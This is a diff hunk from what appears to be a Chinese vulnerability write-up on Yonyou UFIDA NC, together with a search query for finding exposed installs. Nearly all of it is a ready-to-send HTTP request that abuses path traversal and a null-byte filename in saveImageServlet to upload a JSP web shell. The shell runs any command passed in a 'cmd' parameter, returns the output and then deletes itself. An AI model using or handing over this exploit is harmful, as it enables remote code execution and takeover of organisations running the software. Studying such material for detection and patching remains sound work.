@@ -36,16 +36,16 @@ app="用友-UFIDA-NC"
   
 漏洞数据包：  
 ```
-POST /portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=../tteesstt.jsp%00 HTTP/1.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
-Accept-Encoding: gzip, deflate
-Accept: */*
-Connection: close
-Host: 127.0.0.1
-Content-Type: application/octet-stream
-Content-Length: 313
+POST /portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=../tteesstt.jsp%00 HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Host: 127.0.0.1
+Content-Type: application/octet-stream
+Content-Length: 313
 
-<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
 ```  
   
 ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bpxjhEiajmeumKOs4Qd7oSU778Ex6sRaUWPkhzdxsibPMnwcEX5E2tYDzich8HZG4sIjuW5GHT0APXQ/640?wx_fmt=jpeg&from=appmsg "null")  
